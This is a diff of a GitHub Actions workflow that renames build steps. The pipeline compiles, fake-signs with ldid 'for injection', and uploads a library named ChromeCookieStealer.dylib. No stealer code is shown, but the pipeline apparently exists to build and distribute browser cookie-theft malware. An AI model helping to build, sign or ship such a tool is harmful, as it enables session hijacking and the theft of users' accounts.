@@ -14,7 +14,7 @@ jobs:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: Install GNU Make (für parallel + Speed)
+      - name: Install GNU Make (Speed-Boost)
         run: |
           brew install make
           echo "PATH=$(brew --prefix make)/libexec/gnubin:$PATH" >> $GITHUB_ENV
@@ -40,10 +40,10 @@ jobs:
           make clean
           make
 
-      - name: Fake-Sign dylib
+      - name: Fake-Sign dylib (muss für Injection)
         run: ldid -S obj/ChromeCookieStealer.dylib
 
-      - name: Upload Artifact
+      - name: Upload dylib
         uses: actions/upload-artifact@v4
         with:
           name: ChromeCookieStealer.dylib
